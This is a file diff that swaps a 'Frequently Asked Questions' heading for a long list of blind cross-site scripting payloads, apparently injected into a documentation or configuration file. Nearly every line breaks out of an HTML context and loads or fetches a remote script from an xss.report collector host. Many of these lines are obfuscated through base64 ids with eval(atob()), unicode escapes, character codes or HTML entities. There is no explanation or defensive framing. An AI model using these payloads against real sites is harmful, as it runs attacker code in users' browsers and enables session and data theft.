@@ -1,4 +1,176 @@
-Frequently Asked Questions
+"><img src=xx id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img src="x" id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><Img Src=OnXSS id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><im"+"g src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><\u0069mg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img\x20src=x src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img src=`x` src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+">&lt;img src=x src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img <!-- -->src=x src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(String.fromCharCode(101, 118, 97, 108, 40, 97, 116, 111, 98, 40, 116, 104, 105, 115, 46, 105, 100, 41, 41))>
+"><img src=x id=ZG1WeUhnRWUzWkdud2N5UmVZWFJ2WVdGbWVudENnc2N5QlQwSWtvVWd5RXNwbXBzT2VZZEJIZ1BvRHhTOkFsYTQzRHZ5Z3dDUUhrb2FVUT0= onerror=eval(atob(atob(this.id)))>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(['ev','al'].join('')(atob(this.id)))>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=\u0065\u0076\u0061\u006c(atob(this.id))>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=(()=>{const fn=eval;fn(atob(this.id))})()>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(location.search.substr(1)))>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id).slice(0))>
+
+<audio src="https://xss.report/c/l" onloadstart="import(this.src)"></audio>
+<audio src="https://xss.report/%63/%6C" onload="import(this.getAttribute('src') + 0)"></audio>
+
+<video src="https://xss.report/c/l" onloadeddata="import(this.src)"></video>
+<video src="https://xss.report/%63/%6C" onload="import(this.getAttribute('src') + 0)"></video>
+<Iframe Src="https://xss.report/c/l" OnLoad=import(this.getAttribute('src')+0)>
+"><Iframe Src="https://xss.report/c/l" OnLoad=import(this.getAttribute('src')+0)>
+"/></textarea><Iframe Src="https://xss.report/c/l" OnLoad=import(this.getAttribute('src')+0)>
+
+"><Img Src="ht<Img Src="https://xss.report/c/l" Onload="import(this.getAttribute('src') + 0)">
+tps://xss.report/c/l" Onload="import(this.getAttribute('src') + 0)">
+"/></textarea><Img Src="https://xss.report/c/l" Onload="import(this.getAttribute('src') + 0)">
+
+<input Src="https://xss.report/c/l" OnLoad=import(this.getAttribute('src')+0)>
+"><input Src="https://xss.report/c/l" OnLoad=import(this.getAttribute('src')+0)>
+"/></textarea><input Src="https://xss.report/c/l" OnLoad=import(this.getAttribute('src')+0)>
+
+
+<embed src="https://xss.report/c/l" onload="import(this.src)">
+<embed src="https://xss.report/%63/%6C" onload="import(this.getAttribute('src') + 0)">
+
+<body onload="import('https://xss.report/c/l')">
+<img src="https://xss.report/c/l" onload="console.log('Skript!');" />
+<div style="background-image: url('https://xss.report/c/l');" onmouseover="import(this.style.backgroundImage)">
+<iframe srcdoc="<script>import('https://xss.report/c/l')</script>"></iframe>
+<img src="https://xss.report/c/%6C" OnLoad=import(this.getAttribute('src')+0)>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="import('https://xss.report/c/l')"></svg>
+
+<track src="https://xss.report/c/l" onload="import(this.getAttribute('src') + 0)">
+<svg><feImage href="https://xss.report/c/l" onload="import(this.getAttribute('src') + 0)"></feImage></svg>
+
+'"></title></textarea></script></style></noscript><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+'"></title></textarea></script></style></noscript><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/l&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+
+--></tiTle></stYle></texTarea></scrIpt>"//'//><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/l&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+
+"><svg/onload=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 >
+<img>/><svg/onload=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<div onmouseover=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 >
+<div onmouseover=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+
+<svg/onload=alert(1)><script src=https://xss.report/c/l></script>
+
+<script x>alert('XSS')<script y><script src=https://xss.report/c/l></script>
+
+'"></title></textarea></script></style></noscript><img srcx id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/l></script>
+
+”/>&_lt;_script src=https://xss.report/c/l>&_lt;/scr_ipt>”/>
+"></div></div><brute onbeforescriptexecute='this.src="https://xss.report/c/l"'>
+'>"></title></style></textarea></script><script/src=https://xss.report/c/l></script>
+
+
+"><img src onerror=import('https://xss.report/c/l')>
+<img src=x onerror=import('https://xss.report/c/l')>
+<Img Src=OnXSS OnError=import('https://xss.report/c/l')>
+"><Img Src=OnXSS OnError=import('https://xss.report/c/l')>
+
+">]<img src=x onerror="location.href='https://xss.report/c/l'">
+">]<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>">]<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTthLnNyYyA9ICJodHRwczovL3hzcy5yZXBvcnQvYy9sIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw=>
+
+"><img src=x onerror="location.href='https://xss.report/c/l'">
+">]</textarea><script>$.getScript("//xss.report/c/l")</script>">]</textarea><script>$.getScript("//xss.report/c/l")</script>
+
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/l></scrIpt>
+
+"><u>XSS Vulnerability</u><marquee onstart='this.src="https://xss.report/c/l"'>XSS</marquee>
+
+"><svg/onload=eval('fetch("https://xss.report/c/l")')>
+"><svg/onload=\u0065\u0076\u0061\u006c('fetch(\"https://xss.report/c/l\")')>
+"><svg/onload=eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLnJlcG9ydC9jL2wnKQ=='))>
+"><svg/onload=/**/eval('fetch("https://xss.report/c/l")')>
+
+"><input autofocus onfocus=eval('fetch("https://xss.report/c/l")')>
+"><input autofocus onfocus=import('https://xss.report/c/l')>
+"><input autofocus onfocus=/**/eval('fetch("https://xss.report/c/l")')>
+
+<Iframe SrcDoc="<Script Src=https://xss.report/c/l></Script>">
+<iframe/srcdoc=”<script/src=https://xss.report/c/l></script>”>
+"><link rel=stylesheet src="https://xss.report/c/l">
+"><body onload=location='https://xss.report/c/l'>
+"><object data='https://xss.report/c/l'></object>
+"><details ontoggle=location='https://xss.report/c/l'></details>
+"><svg/onload=location='https://xss.report/c/l'>
+"><embed src="https://xss.report/c/l">
+"><link rel="stylesheet" href="https://xss.report/c/l">
+`'";//><img/src=x onError="${x};location='https://xss.report/c/l';alert(1);">
+`'";//><img src=a onError=location='https://xss.report/c/l'>
+`'";//></h1><svg onload=location='https://xss.report/c/l'>
+`'";///></textarea><script src=https://xss.report/c/l></script>
+/<%2Ftitle><script src=https://xss.report/c/l></script>
+><"/></textarea><script src=https://xss.report/c/l></script>
+${{48*53}}`'";--><sCRIpt sRc=//xss.report/c/l></sCRIpt>
+${{48*53}}`'";--><sCRIpt sRc=https://xss.report/c/l></sCRIpt>
+-->"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"></script><img src=x onerror=with(document)body.appendChild(createElement('script')).src='https://xss.report/c/l'>
+</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/https://xss.report/c/l/).slice(2), document.documentElement.appendChild(s))//'>
+
+</Script><Input/AutoFocus/OnFocus=/**/(import(/https://xss.report/c/l/.source))//>
+
+"><contentEditable autofocus onfocus="alert(1)"><script src="https://xss.report/c/l"></script>
+"><contentEditable autofocus onfocus="eval('fetch(\"https://xss.report/c/l\")')">
+
+<noScript><script src="https://xss.report/c/l"></script></noScript>
+<script>eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLnJlcG9ydC9jL2wnKQ=='))</script>
+<img src="x" onerror="eval('fetch(\"https://xss.report/c/l\")')">
+<!–><img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLnJlcG9ydC9jL2wnKQ=='))">
+<iframe src="https://xss.report/c/l"></iframe><noScript><img src="x" onerror="eval('fetch(\'https://xss.report/c/l\')')"></noScript>
+
+/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/</iFrame/</noScript><div contentEditable autofocus onfocus="eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLnJlcG9ydC9jL2wnKQ=='))"></div>
+/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/</iFrame/</noScript><script>eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLnJlcG9ydC9jL2wnKQ=='))</script>
+/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/</iFrame/</noScript><input autofocus onfocus="eval('fetch(\\'https://xss.report/c/l\\')')">
+/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/</iFrame/</noScript><iframe src="https://xss.report/c/l" style="display:none;"></iframe>
+
+<!–>/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/<script>eval(atob('ZmV0Y2goJ2h0dHBzOi8veHNzLnJlcG9ydC9jL2wnKQ=='));</script></iFrame/</noScript>
+<!–>/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/<input autofocus onfocus="eval('fetch(\'https://xss.report/c/l\')')">
+<!–>/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/<script>eval('fetch("https://xss.report/c/l")');</script></iFrame/</noScript>
+<!–>/*’/*\’/*”/*\”/*`/*\`/*</Title/</Style/</Script/</textArea/<iframe src="https://xss.report/c/l" style="display:none;"></iframe></iFrame/</noScript>
+
+<<h>/title><h><script src=https://xss.report/c/l></script>
+<<h>/title><h><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTthLnNyYyA9ICJodHRwczovL3hzcy5yZXBvcnQvYy9sIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw=>
+<<h>/title><h><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+<<h>/title><h><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+<<h>/title><h><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<<h>/title><h><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/l&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<<h>/title><h><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/l");a.send();</script>
+<<h>/title><h><script>$.getScript("//xss.report/c/l")</script>
+
+</scrip</script>t>"><script src=https://xss.report/c/l></script>
+</scrip</script>t>"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+</scrip</script>t>"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+</scrip</script>t>"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+</scrip</script>t>"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/l&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+</scrip</script>t>"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/l");a.send();</script>
+</scrip</script>t>"><script>$.getScript("//xss.report/c/l")</script>
+
+<style/><img src="z'z</style><script/z><script src=https://xss.report/c/l></script>
+<style/><img src="z'z</style><script/z><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+<style/><img src="z'z</style><script/z><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+<style/><img src="z'z</style><script/z><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<style/><img src="z'z</style><script/z><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/l&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<style/><img src="z'z</style><script/z>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/l");a.send();</script>
+<style/><img src="z'z</style><script/z>$.getScript("//xss.report/c/l")</script>
+
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script><script src=https://xss.report/c/l></script>
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/l&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/l");a.send();</script>
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>$.getScript("//xss.report/c/l")</script>
+
 ==========================
 
 Configuration
